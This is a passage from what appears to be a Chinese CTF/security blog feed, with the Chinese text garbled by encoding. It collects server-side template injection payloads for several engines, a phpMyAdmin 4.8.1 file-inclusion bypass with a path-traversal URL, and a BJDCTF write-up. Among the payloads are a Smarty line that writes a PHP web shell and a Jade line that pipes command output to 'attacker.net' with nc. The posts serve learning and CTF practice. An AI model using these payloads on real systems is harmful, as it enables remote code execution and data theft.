href="#0x03ï¼šæ³¨å…¥æ‰‹æ³•ï¼ˆps-è¿™æ˜¯ä¸€å¼ æ‰¾æ¥çš„å›¾ç‰‡ï¼‰" class="headerlink" title="0x03ï¼šæ³¨å…¥æ‰‹æ³•ï¼ˆps:è¿™æ˜¯ä¸€å¼ æ‰¾æ¥çš„å›¾ç‰‡ï¼‰"></a>0x03ï¼šæ³¨å…¥æ‰‹æ³•ï¼ˆps:è¿™æ˜¯ä¸€å¼ æ‰¾æ¥çš„å›¾ç‰‡ï¼‰</h4><p> å¯¹äºæ¨¡æ¿æ³¨å…¥æ¼æ´çš„ç ”ç©¶å¯ä»¥å‚è€ƒSQLæ³¨å…¥ï¼Œå®¢æˆ·ç«¯çš„æ¨¡æ¿æ³¨å…¥ï¼ˆCSTIï¼‰åªèƒ½XSSï¼Œè€ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰åˆ™å¯èƒ½é€ æˆXSSã€LFIå’Œä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p> æ¼æ´å‘ç°åŠåˆ©ç”¨æ­¥éª¤åˆ†ä¸ºï¼šæ¢æµ‹ã€åˆ¤æ–­ã€åˆ©ç”¨ï¼ˆè¯»å–ã€æ¢ç´¢ã€æ”»å‡»ï¼‰</p><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.jpg" class="" title="examplename"><h4 id="0x04ï¼šåˆ¤æ–­æ¼æ´"><a href="#0x04ï¼šåˆ¤æ–­æ¼æ´" class="headerlink" title="0x04ï¼šåˆ¤æ–­æ¼æ´"></a>0x04ï¼šåˆ¤æ–­æ¼æ´</h4><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.jpeg" class="" title="examplename"><p>é€šè¿‡å›¾ç‰‡ä¸­çš„payloadå¯ä»¥å¿«é€Ÿåˆ¤æ–­</p><p>ç»¿çº¿è¡¨ç¤ºæˆåŠŸï¼Œçº¢çº¿å¤±è´¥ã€‚49ä¼šåœ¨ Twig ä¸­è¿”å›49ï¼Œè€Œåœ¨ Jinja2 ä¸­åˆ™æ˜¯7777777</p><h4 id="1x01ï¼šæ”¶é›†åˆ°çš„ä¸€äº›æ¨¡æ¿æ³¨å…¥payload-å…·ä½“çš„æ¨¡æ¿å¯ä»¥è‡ªè¡Œç™¾åº¦äº†è§£"><a href="#1x01ï¼šæ”¶é›†åˆ°çš„ä¸€äº›æ¨¡æ¿æ³¨å…¥payload-å…·ä½“çš„æ¨¡æ¿å¯ä»¥è‡ªè¡Œç™¾åº¦äº†è§£" class="headerlink" title="1x01ï¼šæ”¶é›†åˆ°çš„ä¸€äº›æ¨¡æ¿æ³¨å…¥payload,å…·ä½“çš„æ¨¡æ¿å¯ä»¥è‡ªè¡Œç™¾åº¦äº†è§£"></a>1x01ï¼šæ”¶é›†åˆ°çš„ä¸€äº›æ¨¡æ¿æ³¨å…¥payload,å…·ä½“çš„æ¨¡æ¿å¯ä»¥è‡ªè¡Œç™¾åº¦äº†è§£</h4><p>FreeMakerï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line">return:uid&#x3D;119(tomcat7) gid&#x3D;127(tomcat7) groups&#x3D;127(tomcat7)</span><br></pre></td></tr></table></figure><p>Velocity:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($str&#x3D;$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr&#x3D;$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex&#x3D;$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out&#x3D;$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line">&#x2F;&#x2F;è¾“å‡º tomcat7</span><br></pre></td></tr></table></figure><p>Smarty:</p><p>1)å†™æ–‡ä»¶åˆ›å»ºåé—¨:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure><p>2)ä»»æ„è¯»å–æ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure><p>Twig:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;è¿”å›ç»“æœï¼š uid&#x3D;1000(k) gid&#x3D;1000(k) groups&#x3D;1000(k),10(wheel)</span><br></pre></td></tr></table></figure><p>jade:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var x &#x3D; root.process</span><br><span class="line">x &#x3D; x.mainModule.require</span><br><span class="line">x &#x3D; x(&#39;child_process&#39;)</span><br><span class="line">x.exec(&#39;id | nc attacker.net 80&#39;)</span><br></pre></td></tr></table></figure><p>pythonæ¨¡æ¿æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;éå†åŸºç±» æ‰¾åˆ°evalå‡½æ•°</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;æ‰¾åˆ°äº†</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;å¯¼å…¥cmd æ‰§è¡Œpopené‡Œçš„å‘½ä»¤ readè¯»å‡ºæ•°æ®</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>ä¸€äº›è¡¥å……ï¼š</p><h3 id="flaskçš„å˜é‡å’Œå‡½æ•°"><a href="#flaskçš„å˜é‡å’Œå‡½æ•°" class="headerlink" title="flaskçš„å˜é‡å’Œå‡½æ•°"></a>flaskçš„å˜é‡å’Œå‡½æ•°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flask ä¸­æœ‰å†…ç½®çš„çš„å˜é‡å‡½æ•° ï¼Œé‚£äº›ç‰¹æ®Šçš„å˜é‡å¯ä»¥å®ç°æŸäº›åŠŸèƒ½</span><br><span class="line"></span><br><span class="line">config ï¼šå¯ä»¥ä»æ¨¡æ¿ä¸­ç›´æ¥è®¿é—®Flaskå½“å‰çš„configå¯¹è±¡ï¼š&#123;&#123;config.SQLALCHEMY_DATABASE_URL&#125;&#125;</span><br><span class="line"></span><br><span class="line">request : å°±æ˜¯flaskä¸­ä»£è¡¨å½“å‰è¯·æ±‚çš„requestå¯¹è±¡ ï¼Œ &#123;&#123;request.url&#125;&#125;</span><br><span class="line"></span><br><span class="line">session :ä¸ºFlaskçš„sessionå¯¹è±¡ ,&#123;&#123;session.new&#125;&#125; True</span><br><span class="line"></span><br><span class="line">gå˜é‡ï¼šåœ¨è§†å›¾å‡½æ•°ä¸­è®¾ç½®gå˜é‡çš„é‚£ä¹ˆå±æ€§çš„å€¼ï¼Œç„¶åå†æ¨¡æ¿ä¸­ç›´æ¥å¯ä»¥å–å‡º&#123;&#123;g.name&#125;&#125;</span><br><span class="line"></span><br><span class="line">url_for() : url_forä¼šæ ¹æ®ä¼ å…¥çš„è·¯ç”±å™¨å‡½æ•°åï¼Œè¿”å›è¯¥è·¯ç”±çš„URLï¼Œåœ¨æ¨¡æ¿ä¸­å§‹ç»ˆä½¿ç”¨url_forï¼ˆï¼‰å°±å¯ä»¥å®‰å…¨çš„ä¿®æ”¹è·¯ç”±ç»‘å®šçš„URLï¼Œåˆ™ä¸å¿…æ‹…å¿ƒæ¨¡æ¿ä¸­æ¸²æŸ“é”™çš„è¿æ¥ï¼Œ&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ï¼Œå¦‚æœæˆ‘ä»¬å®šä¹‰çš„è·¯ç”±URLæ˜¯å¸¦æœ‰å‚æ•°çš„ï¼Œåˆ™å¯ä»¥æŠŠä»–ä»¬ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ å…¥url_forï¼ˆï¼‰ï¼ŒFlaskä¼šæŠŠä»–ä»¬å¡«å……è¿›æœ€ç»ˆç”Ÿæˆçš„URLä¸­ï¼Œ&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¹‹å‰åœ¨flaskä¸­é€šè¿‡flaskï¼ˆï¼‰ä¼ å…¥çš„æ¶ˆæ¯çš„åˆ—è¡¨ï¼Œflashå‡½æ•°çš„ä½œç”¨å¾ˆç®€å•ï¼Œå¯ä»¥æŠŠç”±Pythonå­—ç¬¦ä¸²è¡¨ç¤ºçš„ä¿¡æ¯åŠ å…¥ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œåœ¨ä½¿get_flashed_message()å‡½æ•°å–å‡ºä»–ä»¬å¹¶æ¶ˆè´¹æ‰</span><br><span class="line"></span><br><span class="line">&#123;%for message in get_flashed_messages()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;message&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01-ç®€ä»‹&quot;&gt;&lt;a href=&quot;#0x01-ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;0x01:ç®€ä»‹&quot;&gt;&lt;/a&gt;0x01:ç®€ä»‹
    
    </summary>
    
    
    
      <category term="æ¨¡æ¿æ³¨å…¥" scheme="http://yoursite.com/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin4.8.1ä»»æ„æ–‡ä»¶åŒ…å«</title>
    <link href="http://yoursite.com/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-02-07T10:36:39.000Z</published>
    <updated>2020-03-12T01:23:19.142Z</updated>
    
    <content type="html"><![CDATA[<p>phpmyadminç®€è¿°ï¼š<a id="more"></a></p><p>phpMyAdmin æ˜¯ä¸€ä¸ªä»¥PHPä¸ºåŸºç¡€ï¼Œä»¥Web-Baseæ–¹å¼æ¶æ„åœ¨ç½‘ç«™ä¸»æœºä¸Šçš„MySQLçš„æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œè®©ç®¡ç†è€…å¯ç”¨Webæ¥å£ç®¡ç†MySQLæ•°æ®åº“ã€‚å€Ÿç”±æ­¤Webæ¥å£å¯ä»¥æˆä¸ºä¸€ä¸ªç®€æ˜“æ–¹å¼è¾“å…¥ç¹æ‚SQLè¯­æ³•çš„è¾ƒä½³é€”å¾„ï¼Œå°¤å…¶è¦å¤„ç†å¤§é‡èµ„æ–™çš„æ±‡å…¥åŠæ±‡å‡ºæ›´ä¸ºæ–¹ä¾¿ã€‚å…¶ä¸­ä¸€ä¸ªæ›´å¤§çš„ä¼˜åŠ¿åœ¨äºç”±äºphpMyAdminè·Ÿå…¶ä»–PHPç¨‹å¼ä¸€æ ·åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä½†æ˜¯æ‚¨å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨è¿™äº›ç¨‹å¼äº§ç”Ÿçš„HTMLé¡µé¢ï¼Œä¹Ÿå°±æ˜¯äºè¿œç«¯ç®¡ç†MySQLæ•°æ®åº“ï¼Œæ–¹ä¾¿çš„å»ºç«‹ã€ä¿®æ”¹ã€åˆ é™¤æ•°æ®åº“åŠèµ„æ–™è¡¨ã€‚ä¹Ÿå¯å€Ÿç”±phpMyAdminå»ºç«‹å¸¸ç”¨çš„phpè¯­æ³•ï¼Œæ–¹ä¾¿ç¼–å†™ç½‘é¡µæ—¶æ‰€éœ€è¦çš„sqlè¯­æ³•æ­£ç¡®æ€§ã€‚</p><p>0x01å½±å“ç‰ˆæœ¬</p><p>phpmyadmin4.8.1</p><p>0x02æ¼æ´åˆ†æ</p><p>ä¸‹é¢çš„å†…å®¹å€Ÿé‰´äº†ChaMd5å®‰å…¨å›¢é˜Ÿçš„æ–‡ç« ï¼Œé™„ä¸Šé“¾æ¥ï¼š<code>https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>â€‹    æ€»çš„æ¥è¯´å‘¢ï¼Œé—®é¢˜å°±å‡ºç°åœ¨è¿™ä¸€å—ä»£ç ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œç»•è¿‡ç™½åå•æ£€æµ‹ï¼Œï¼Ÿä¸¤æ¬¡urlç¼–ç ä¸º%253få°±å¯ä»¥ç»•è¿‡éªŒè¯</p><p>0x03ä¾‹é¢˜åˆ†æ</p><p>ä¸‹é¢æ˜¯ä¸€é“buuctfä¸Šçš„é¢˜ç›®:warmup</p><p>æ‰“å¼€é¢˜ç›®å‡ºç°çš„æ˜¯ä¸€ä¸ªè¡¨æƒ…ï¼Œç›´æ¥æ¥çœ‹ç½‘é¡µçš„æºç ï¼Œå‘ç°äº†æç¤ºæœ‰source.phpçš„æ–‡ä»¶</p><img src="/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" class="" title="examplename"><p>è®¿é—®source.phpï¼Œçœ‹åˆ°äº†æºç </p><img src="/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png" class="" title="examplename"><p>åšè¿™é“é¢˜ç›®çš„æ—¶å€™å…¶å®æˆ‘å¹¶ä¸çŸ¥é“è¿™æ˜¯phpmyadmin4.8.1æ¼æ´ï¼Œæ‰€ä»¥å½“æ—¶æ‰¾äº†ä¸€ç¯‡wp</p><p>åœ¨å­¦ä¹ äº†è¿™ä¸ªæ¼æ´ä¹‹åï¼Œå¤§æ¦‚å°±æ¸…æ¥šäº†è¿™æ®µä»£ç æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œæœ‰æˆ‘åœ¨ä¸Šé¢é™„ä¸Šçš„é‚£æ®µä»£ç ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥æ¥æ„é€ payloadäº†ï¼Œå¯¹äº†è¦å…ˆè®¿é—®hint.phpä¼šå¾—åˆ°æç¤ºè¯´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œpayload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://efeb72fa-cfeb-4026-8537-6857f5beace4.node3.buuoj.cn/index.php?file=hint.php%253f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¾—åˆ°äº†flag:<code>flag{658a2242-c7eb-42fe-8856-76b69e728c0f}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpmyadminç®€è¿°ï¼š
    
    </summary>
    
    
    
      <category term="æ–‡ä»¶åŒ…å«" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTFwp</title>
    <link href="http://yoursite.com/2020/01/17/BJDCTFwp/"/>
    <id>http://yoursite.com/2020/01/17/BJDCTFwp/</id>
    <published>2020-01-17T08:15:06.000Z</published>
    <updated>2020-03-12T01:27:44.125Z</updated>
    
    <content type="html"><![CDATA[<p>Misc</p><ol><li>ç­¾ä¸ªåˆ°ï¼Ÿ<a id="more"></a></li></ol><p>æ–‡ä»¶ä¸‹è½½ä¸‹æ¥æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹ç¼©å‘ç°é‡Œé¢è¿˜æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç›´æ¥è§£å‹æç¤ºæ–‡ä»¶æŸåè§£å‹å¤±è´¥</p><img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B0.png" class="" title="examplename"><p>ä¸å‡æ€ç´¢ï¼Œç›´æ¥ä¸¢åˆ°kalié‡Œé¢ï¼Œforemostä¸€ä¸‹ï¼Œåˆ†ç¦»å‡ºäº†ä¸€å¼ å›¾ç‰‡ï¼Œæ‰“å¼€æ˜¯äºŒç»´ç ï¼Œæ‰«ä¸€æ‰«ï¼Œæ‹¿åˆ°Flag</p><img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B01.png" class="" title="examplename"><ol start="2"><li>ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥ï¼Ÿ</li></ol><p>ä¸‹è½½è¿‡æ¥æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‘ç°æ‰“ä¸å¼€ï¼Œæƒ³åˆ°å¯èƒ½æ˜¯æ–‡ä»¶åç¼€çš„é—®é¢˜ï¼Œä¸¢åˆ°winhexé‡Œé¢å‘ç°äº†æ˜¯pngå›¾ç‰‡ï¼Œæ­£æƒ³è¦æ”¹åç¼€çš„æ—¶å€™ï¼ŒæŠŠwinhexç›´æ¥æ‹‰åˆ°åº•å‘ç°äº†Flag</p><img src="/2020/01/17/BJDCTFwp/cai.png" class="" title="examplename"><ol start="3"><li>é¸¡ä½ å¤ªç¾</li></ol><p>å‹ç¼©åŒ…è§£å‹ï¼Œä¸€ä¸ªæ˜¯gifï¼Œä¸€ä¸ªæ˜¯å®ƒçš„å‰¯æœ¬ï¼ŒæŠŠgifæ–‡ä»¶ä¸¢åˆ°winhexé‡Œé¢ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ã€‚æœ¬ç€è¯•è¯•çš„æƒ³æ³•ï¼ŒæŠŠå‰¯æœ¬ä¸¢åˆ°winhexé‡Œé¢ï¼Œå‘ç°æœ€å¼€å¤´æœ‰9aï¼Œå†æƒ³åˆ°å‰é¢çš„æ˜¯gifæ–‡ä»¶ï¼Œgifæ–‡ä»¶å¤´åˆšå¥½æ˜¯GIF89aï¼ŒæŠŠæ–‡ä»¶å¤´è¡¥å…¨é‡æ–°ä¿å­˜ä¸ºGIFæ–‡ä»¶ï¼ŒFlagå‡ºæ¥äº†ã€‚</p><img src="/2020/01/17/BJDCTFwp/%E9%B8%A1%E5%A4%AA%E7%BE%8E.png" class="" title="examplename"><ol start="4"><li>just a rar</li></ol><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå››ä½æ•°.rarçš„æ–‡ä»¶ï¼Œç›´æ¥ä¸Šå·¥å…·è¿›è¡Œçˆ†ç ´.</p><img src="/2020/01/17/BJDCTFwp/rar.png" class="" title="examplename"><p>å¯†ç æ˜¯2016ï¼Œæ‰“å¼€è§£å‹ç¼©å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæ”¾åˆ°winhexé‡Œé¢ä»€ä¹ˆä¸œè¥¿éƒ½æ²¡æœ‰ï¼Œæ”¾åˆ°kalié‡Œï¼Œbinwalkï¼Œforemostéƒ½æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</p><p>çªç„¶æƒ³åˆ°ä»¥å‰åšè¿‡çš„ä¸€é“é¢˜ï¼Œæ‰“å¼€å±æ€§ï¼Œåœ¨å¤‡æ³¨é‡Œæ‰¾åˆ°äº†flag</p><img src="/2020/01/17/BJDCTFwp/rar1.png" class="" title="examplename"><p>Crypto</p><ol><li>sign in</li></ol><p>æ‰“å¼€æ˜¯è¿™æ ·çš„<img src="/2020/01/17/BJDCTFwp/signin1.png" class="" title="examplename"></p><p>æŠŠbase16ï¼Œ64ï¼Œ32æŒ¨ä¸ªè¯•ä¸€ä¸‹ï¼Œæ˜¯base16åŠ å¯†</p><p>æ‰¾ä¸€ä¸ªçº¿è§£å¯†ç½‘ç«™</p><img src="/2020/01/17/BJDCTFwp/signin.png" class="" title="examplename"><ol start="2"><li>ç¼–åˆ¶ä¸è°ƒåˆ¶</li></ol><p>æ‰“å¼€ä¸‹è½½æ–‡ä»¶å¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶å’Œä¸€ä¸ªå¸¦hintçš„å›¾ç‰‡ï¼Œæ ¹æ®hintçš„å›¾ç‰‡çŒœæµ‹æ˜¯æ›¼å½»æ–¯ç‰¹åŠ å¯†</p><p>ç½‘ä¸Šæœåˆ°äº†ä¸€ä¸ªè„šæœ¬ï¼Œæ‹¿è¿‡æ¥è·‘ä¸€ä¸‹å°±å‡ºæ¥äº†</p><img src="/2020/01/17/BJDCTFwp/%E7%BC%96%E5%88%B6.png" class="" title="examplename"><ol start="3"><li>Polybius</li></ol><p>æ‰“å¼€æ–‡ä»¶</p><img src="/2020/01/17/BJDCTFwp/polybius.png" class="" title="examplename"><p>Hintbase64è§£å¯†å¾—åˆ°æç¤ºæ˜æ–‡æ˜¯16ä½æ•°å­—</p><p>ç™¾åº¦äº†ä¸€ä¸‹æ‰¾åˆ°äº†å¯¹åº”çš„æ£‹ç›˜åŠ å¯†ï¼Œä¸è¿‡æ£‹ç›˜æœ‰æ”¹åŠ¨ï¼Œæƒ³åˆ°flagå¤§å¤šæ˜¯ä¸€å¥è¯ï¼Œé‚£å°±ä¸€ä¸ªä¸ªè¯•</p><img src="/2020/01/17/BJDCTFwp/%E6%A3%8B%E7%9B%98.jpg" class="" title="examplename"><p>æ‰‹åŠ¨å¯¹åº”è§£å¯†ï¼Œå¾—åˆ°flagï¼šBJD{flagispolybius}</p><p>4.EASYRSA</p><img src="/2020/01/17/BJDCTFwp/RSA1.png" class="" title="examplename"><p>æ‰“å¼€æ‹¿åˆ°çš„ä¸€æ®µä»£ç ï¼Œä¸Šç½‘æœäº†ä¸€ä¸‹æœ‰å…³RSAåŠ å¯†çš„çŸ¥è¯†ï¼Œå†æ‰¾äº†ä¸€ä¸ªå¯æ”»å‡»çš„è„šæœ¬æ¥è¿›è¡Œåè§£å…ˆå¾—åˆ°på’Œqï¼Œå†æ¥è§£mçš„å€¼ï¼Œæœ€ålong_to_bytes(m)å°±å¯ä»¥å¾—åˆ°flagäº†</p><img src="/2020/01/17/BJDCTFwp/rsa.png" class="" title="examplename"><p>Web</p><p>1.Hello World</p><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œç‚¹å‡»sketch includedï¼Œå°±æ˜¯ç•Œé¢å¼€å§‹çš„é‚£ä¸ªï¼Œå‡ºç°æ–‡å­—æ³¨æ„ä½ çš„idï¼Œç”¨burp suiteæŠ“åŒ…ï¼Œæ ¹æ®æ”¾å‡ºæ¥çš„hintæ˜¯idä¸adminæœ‰å…³</p><p>åŒæ—¶åœ¨burpä¸­çœ‹åˆ°idçš„æ ¼å¼ï¼Œåœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ id:admin+base64(admin),sendä¸€ä¸‹ï¼Œè¿”å›å¦‚ä¸‹</p><img src="/2020/01/17/BJDCTFwp/hello4.png" class="" title="examplename"><p>X-Forwarded-For:127.0.0.1</p><img src="/2020/01/17/BJDCTFwp/hello1.png" class="" title="examplename"><p>Referer:<a href="https://google.com" target="_blank" rel="noopener">https://google.com</a></p><img src="/2020/01/17/BJDCTFwp/hello2.png" class="" title="examplename"><p>2.easy_upload</p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä»¥jpgæ ¼å¼ä¸Šä¼ ï¼Œè®¿é—®æç¤ºç»™çš„åœ°å€</p><img src="/2020/01/17/BJDCTFwp/upload2.png" class="" title="examplename"><p>å‚è€ƒäº†ä¸€ç¯‡åšå®¢ï¼Œå­¦åˆ°äº†ç›´æ¥è¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹</p><img src="/2020/01/17/BJDCTFwp/upload.png" class="" title="examplename"><p>3.Hidden serects</p><p>æŠ“ä¸€ä¸‹åŒ…ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€æ®µpassword</p><img src="/2020/01/17/BJDCTFwp/hidden.png" class="" title="examplename"><p>é€šè¿‡å°è¯•å‘ç°æ˜¯md5åŠ å¯†</p><p>è§£å¯†ç™»å½•ç½‘ç«™</p><p>æ‰“å¼€å‘ç°è¿˜æ˜¯æ²¡ä»€ä¹ˆä¸œè¥¿ï¼ŒF12å’Œctrlé”®éƒ½ä¸èƒ½ç”¨</p><p>è¿™é‡Œæˆ‘ç”¨äº†ä¸€ä¸ªæ’ä»¶å«restclient,æ‰¾åˆ°flag</p><img src="/2020/01/17/BJDCTFwp/hidden1.png" class="" title="examplename"><p>4.easy md5</p><p>æŠ“ä¸€ä¸‹åŒ…ï¼Œåœ¨ååº”å¤´é‡Œæœ‰ä¸€ä¸ªhint</p><img src="/2020/01/17/BJDCTFwp/MD51.png" class="" title="examplename"><p>æ ¹æ®æ ‘å“¥çš„ä¸€ç¯‡md5åšå®¢ç…§ç€å†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98&#x2F;](https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5çš„ä¸€ç³»åˆ—é—®é¢˜&#x2F;)</span><br></pre></td></tr></table></figure><p>å…ˆæäº¤ffifdyopï¼ŒæŸ¥çœ‹é¡µé¢æºç </p><img src="/2020/01/17/BJDCTFwp/MD52.png" class="" title="examplename"><p>å‘ç°æ˜¯md5å¼±æ¯”è¾ƒ</p><p>æ„é€ 